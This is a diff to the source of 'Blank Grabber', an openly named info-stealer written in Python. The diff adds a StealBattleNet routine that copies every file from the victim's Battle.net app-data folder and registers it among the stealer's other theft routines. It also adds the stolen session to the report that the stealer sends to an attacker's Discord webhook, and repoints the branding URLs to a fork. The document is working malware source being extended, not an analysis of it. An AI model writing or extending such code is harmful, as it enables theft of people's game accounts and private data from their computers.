@@ -946,6 +946,7 @@ class BlankGrabber:
     SteamStolen: bool = False # Indicates whether Steam account was stolen or not
     EpicStolen: bool = False # Indicates whether Epic Games account was stolen or not
     UplayStolen: bool = False # Indicates whether Uplay account was stolen or not
+    BattleNetStolen: bool = False # Idicates whether Battle.Net account was stolen or not
     GrowtopiaStolen: bool = False # Indicates whether Growtopia account was stolen or not
 
     def __init__(self) -> None: # Constructor to call all the functions
@@ -973,6 +974,7 @@ class BlankGrabber:
             (self.StealGrowtopia, False),
             (self.StealSteam, False),
             (self.StealUplay, False),
+            (self.StealBattleNet, False),
             (self.GetAntivirus, False),
             (self.GetClipboard, False),
             (self.GetTaskList, False),
@@ -1155,6 +1157,19 @@ class BlankGrabber:
                         os.makedirs(saveToPath, exist_ok= True)
                         shutil.copy(os.path.join(uplayPath, item), os.path.join(saveToPath, item))
                         self.UplayStolen = True
+    
+    @Errors.Catch
+    def StealBattleNet(self) -> None:
+        if Settings.CaptureGames:
+            Logger.info("Stealing Battle.Net session")
+            saveToPath = os.path.join(self.TempFolder, "Games", "Battle.Net")
+            battlePath = os.path.join(os.getenv("appdata"), "Battle.net")
+            if os.path.isdir(battlePath):
+                for item in os.listdir(battlePath):
+                    if os.path.isfile(os.path.join(battlePath, item)):
+                        os.makedirs(saveToPath, exist_ok= True)
+                        shutil.copy(os.path.join(battlePath, item), os.path.join(saveToPath, item))
+                        self.BattleNetStolen = True
     
     @Errors.Catch
     def StealRobloxCookies(self) -> None: # Steals Roblox cookies
@@ -1669,6 +1684,7 @@ class BlankGrabber:
             "Epic Session" : "Yes" if self.EpicStolen else "No",
             "Steam Session" : "Yes" if self.SteamStolen else "No",
             "Uplay Session" : "Yes" if self.UplayStolen else "No",
+            "Battle.Net Session" : "Yes" if self.BattleNetStolen else "No",
             "Growtopia Session" : "Yes" if self.GrowtopiaStolen else "No",
             "Screenshot" : "Yes" if self.ScreenshotTaken else "No",
             "System Info" : "Yes" if self.SystemInfoStolen else "No"
@@ -1678,7 +1694,7 @@ class BlankGrabber:
 
         match Settings.C2[0]:
             case 0: # Discord Webhook
-                image_url = "https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png"
+                image_url = "https://raw.githubusercontent.com/f4kedre4lity/Blank-Grabber/main/.github/workflows/image.png"
 
                 payload = {
                     "content": "||@everyone||" if Settings.PingMe else "",
@@ -1686,10 +1702,10 @@ class BlankGrabber:
                         {
                             "title": "Blank Grabber",
                             "description": f"**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**",
-                            "url": "https://github.com/Blank-c/Blank-Grabber",
+                            "url": "https://github.com/f4kedre4lity/Blank-Grabber",
                             "color": 34303,
                             "footer": {
-                                "text": "Grabbed by Blank Grabber | https://github.com/Blank-c/Blank-Grabber"
+                                "text": "Grabbed by Blank Grabber | https://github.com/f4kedre4lity/Blank-Grabber"
                             },
                             "thumbnail": {
                                 "url": image_url
